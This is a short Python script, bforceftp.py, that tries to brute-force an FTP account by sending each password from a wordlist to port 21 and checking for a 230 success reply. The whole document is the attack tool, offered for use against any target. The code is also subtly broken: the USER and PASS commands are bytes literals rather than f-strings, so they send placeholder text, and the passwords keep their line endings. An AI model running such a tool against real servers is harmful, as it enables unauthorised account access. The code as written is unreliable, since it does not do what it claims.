#!/usr/bin/python3

import socket
import sys
import re
#A
if len(sys.argv) < 4:
	print('')
	print('Usage: python3 bforceftp.py <target> <user> <passwd-file.txt>')
	print('')
	sys.exit()
else:
	print('')
	print('Brute Force FTP service')
	print('')
	print('')

	target = sys.argv[1]
	user = sys.argv[2]
	f = open(sys.argv[3])

	for passwd in f.readlines():
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target,21))
		s.recv(1024)

		s.send(b"USER {user}\r\n")
		s.recv(1024)
		s.send(b"PASS {passwd}\r\n")
		ans = s.recv(1024)
		s.send(b"QUIT\r\n")

		print(f'[+] Testing {user}:{passwd}...')

		if re.search('230', ans.decode()):
			print(f'[*] Password found ---> {user}:{passwd}')
			print('')
		else:
			print('[*] Access Denied.')
			print('-' * 55)
			print('')
